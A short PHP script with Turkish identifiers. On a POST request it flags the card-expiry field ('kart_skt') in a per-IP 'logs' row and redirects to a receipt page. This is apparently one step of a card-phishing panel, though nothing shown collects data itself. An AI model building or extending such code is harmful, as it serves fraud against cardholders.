<?php
require_once 'inc/brain.php';

$ipAdres = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {


    if (!isset($pdo) || !$pdo) {
        error_log('POST isteği geldi ancak $pdo tanımlı değil veya bağlantı başarısız.');
    } else {
        $yeniDeger = '1';


        $sql = "UPDATE logs SET 
            kart_skt = :yeniDeger 
        WHERE 
            ip_address = :ip
        ORDER BY 
            log_time DESC 
        LIMIT 1";

        try {
            $stmt = $pdo->prepare($sql);

            $stmt->bindParam(':yeniDeger', $yeniDeger); 
            $stmt->bindParam(':ip', $ipAdres);         

            $stmt->execute();
            header("Location: /dekont0.php");


        } catch (\PDOException $e) {
            error_log("Veritabanı UPDATE hatası: " . $e->getMessage());

        }
    }
}
?>